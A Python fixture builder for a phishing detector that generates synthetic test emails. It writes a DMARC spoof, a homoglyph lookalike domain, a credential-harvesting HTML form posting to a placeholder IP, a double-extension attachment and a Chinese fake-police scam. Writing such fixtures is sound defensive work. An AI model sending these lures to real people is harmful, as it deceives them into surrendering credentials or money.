"""Regenerate the synthetic test emails in this folder.

Every message is invented. Hostile domains use the reserved `.example` TLD and
IP addresses come from the 203.0.113.0/24 documentation range, so nothing here
points at a real server. Attachments are short text, never real programs.

    python tests/fixtures/build_fixtures.py
"""

from email.message import EmailMessage
from pathlib import Path

HERE = Path(__file__).parent
LOOKALIKE = "mоnash.edu".encode("idna").decode("ascii")  # Cyrillic 'о' in place of Latin 'o'


def base(sender: str, subject: str, auth: str | None, **headers: str) -> EmailMessage:
    msg = EmailMessage()
    if auth:
        msg["Authentication-Results"] = auth
    msg["From"] = sender
    msg["To"] = "Student <student@example.edu.au>"
    msg["Subject"] = subject
    msg["Date"] = "Tue, 06 Oct 2026 10:15:00 +1100"
    for name, value in headers.items():
        msg[name.replace("_", "-")] = value
    return msg


def clean_newsletter() -> EmailMessage:
    msg = base("Example Society News <news@example.org>", "This week at the Example Society",
               "mx.receiver.example; spf=pass smtp.mailfrom=mail.example.org; "
               "dkim=pass header.d=example.org; dmarc=pass header.from=example.org",
               Return_Path="<bounce@mail.example.org>")
    msg.set_content("Hi all,\n\nThis week we have a coding workshop on Thursday and a social on Friday.\n"
                    "Full details: https://www.example.org/events\n\nSee you there!\n")
    msg.add_alternative('<p>Hi all,</p><p>This week we have a coding workshop on Thursday and a social on Friday.</p>'
                        '<p><a href="https://www.example.org/events">Read the events calendar</a></p>', subtype="html")
    return msg


def dmarc_spoof() -> EmailMessage:
    msg = base("Monash IT Service Desk <servicedesk@monash.edu>", "Action required: verify your Monash account",
               "mx.receiver.example; spf=fail smtp.mailfrom=bulk-sender.example; dkim=none; "
               "dmarc=fail (p=REJECT) header.from=monash.edu",
               Reply_To="IT Desk <reset-desk@helpdesk-mail.example>",
               Return_Path="<bounce@bulk-sender.example>")
    msg.set_content("Dear student,\n\nYour password expires within 24 hours. To keep access, verify your account "
                    "immediately at https://monash-account-verify.example/login\n\nMonash IT Service Desk\n")
    return msg


def lookalike_domain() -> EmailMessage:
    msg = base(f"Monash University <sso@{LOOKALIKE}>", "Your Monash SSO session expires today",
               f"mx.receiver.example; spf=pass smtp.mailfrom={LOOKALIKE}; dkim=pass header.d={LOOKALIKE}; "
               f"dmarc=pass header.from={LOOKALIKE}")
    msg.set_content(f"Hello,\n\nSign in to keep your account active: https://login.{LOOKALIKE}/sso\n")
    return msg


def anchor_mismatch() -> EmailMessage:
    msg = base("Student Services <noreply@campus-notice.example>", "Your enrolment has been updated",
               "mx.receiver.example; spf=pass smtp.mailfrom=campus-notice.example; "
               "dkim=pass header.d=campus-notice.example; dmarc=pass header.from=campus-notice.example")
    msg.set_content("Your enrolment has been updated. Review it at https://my.monash.edu/login\n")
    msg.add_alternative(
        '<p>Your enrolment has been updated.</p>'
        '<p>Review it here: <a href="http://203.0.113.45/monash/login.php">https://my.monash.edu/login</a></p>'
        '<form action="http://203.0.113.45/collect" method="post">'
        '<input name="user"><input name="pass" type="password"><button>Confirm</button></form>',
        subtype="html")
    return msg


def suspicious_attachment() -> EmailMessage:
    msg = base("Accounts Payable <ap@invoices-portal.example>", "Overdue invoice 2026-10",
               "mx.receiver.example; spf=softfail smtp.mailfrom=invoices-portal.example; "
               "dkim=pass header.d=invoices-portal.example; dmarc=pass header.from=invoices-portal.example")
    msg.set_content("Hello,\n\nPlease find the overdue invoice attached. Payment by bank transfer is required "
                    "immediately to avoid a processing fee.\n\nAccounts Payable\n")
    msg.add_attachment(b"PhishLens test fixture. This is plain text, not a program.\n",
                       maintype="application", subtype="octet-stream", filename="Invoice_2026-10.pdf.exe")
    msg.add_attachment("<html><body><p>PhishLens test fixture page.</p></body></html>",
                       subtype="html", filename="remittance.html")
    return msg


def zh_fake_police() -> EmailMessage:
    msg = base("中国驻墨尔本总领事馆 <notice@cn-consulate-service.example>", "【紧急通知】您的护照涉嫌一宗洗钱案件",
               "mx.receiver.example; spf=pass smtp.mailfrom=cn-consulate-service.example; "
               "dkim=pass header.d=cn-consulate-service.example; dmarc=pass header.from=cn-consulate-service.example")
    msg.set_content(
        "您好:\n\n经核查,您的护照涉嫌一宗跨境洗钱案件,国内公安机关已立案调查。"
        "请您在24小时内联系办案警官说明情况,否则将被列为通缉对象。\n\n"
        "为配合调查,您需要缴纳保证金,资金将转入安全账户,结案后退还。"
        "本案涉及国家机密,请严格保密,切勿告知家人或学校。\n\n"
        "办案联系:https://cn-consulate-service.example/case\n")
    return msg


FIXTURES = {
    "clean_newsletter.eml": clean_newsletter,
    "dmarc_spoof.eml": dmarc_spoof,
    "lookalike_domain.eml": lookalike_domain,
    "anchor_mismatch.eml": anchor_mismatch,
    "suspicious_attachment.eml": suspicious_attachment,
    "zh_fake_police.eml": zh_fake_police,
}

if __name__ == "__main__":
    for name, build in FIXTURES.items():
        msg = build()
        msg["Message-ID"] = f"<{name.removesuffix('.eml')}@phishlens.test>"
        (HERE / name).write_bytes(msg.as_bytes())
        print("wrote", name)
